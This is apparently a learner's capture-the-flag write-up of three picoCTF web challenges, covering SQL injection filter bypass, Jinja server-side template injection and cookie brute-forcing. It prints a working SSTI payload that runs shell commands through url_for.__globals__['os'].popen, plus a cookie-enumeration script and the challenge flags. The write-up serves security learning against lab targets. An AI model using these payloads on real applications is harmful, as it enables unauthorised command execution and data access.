# 1. Web Gaunlet

> Can you beat the filters?
Additional details will be available after launching your challenge instance.
## Solution:

- This challenge was easy
- We had been given the filter.php and we coud see which couuld be blocked 
I just used `--` and `/*` to get through all the filters


## Flag:

```
 picoCTF{y0u_m4d3_1t_79a0ddc6}
```

## Concepts learnt:

- about sql injections (didn't know about /* and ;)


## Resources:

- https://ctf101.org/web-exploitation/sql-injection/what-is-sql-injection/

***

# 1. SSTI

> I made a cool website where you can announce whatever you want! Try it out!
Additional details will be available after launching your challenge instance.


## Solution:

So basically I confirmed what template engine we are running by running {{7*7}} which resulted in 49 which means jinja, next I confirmed that if we are running flask by doing {{url_for}} which returned (url_for is a popular method in flask which has os module imported on module level)
```
<bound method Flask.url_for of <Flask 'app'>>
```
which means we can import os and run arbitarary commands 
```
{{url_for.__globals__['os'].popen("ls").read()}}

``` 
to run the ls command, after running the command we see a file flag which we can ofcourse cat
```

{{url_for.__globals__['os'].popen("cat flag").read()}}
``` 
which gives us the flag

## Flag:

```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_9451989d}
```

## Concepts learnt:

Basic SSTI and about jinja, and __globals__ and things like that

## Resources:

![PwnFunctions' video on SSTI](https://www.youtube.com/watch?v=SN6EVIG4c-0)


***




# 1. Cookies

> Who doesn't love cookies? Try to figure out the best one. http://mercury.picoctf.net:6418/
## Solution:

- Since the challenge name was cookies, I went directly to Dev tools -> Application->Cookies
- There was a cookie named name which was set to -1
- Also when I entered the defualt value I would notice that it would go to /check and the name cookie will become 0
- Also I noticed if I entered sth wrong it would remain at -1 
- So what I probably need to do is iterate through all the numbers which are available (guess 50)
```
import requests
for i in range(50):
    a = requests.get("http://mercury.picoctf.net:54219/check", cookies={"name": f"{i}"}).text
    print(a)

```
then I run the scirpt like this `python script.py | grep pico` which gave us the flag

## Flag:

```
picoCTF{3v3ry1_l0v3s_c00k135_96cdadfd}
```

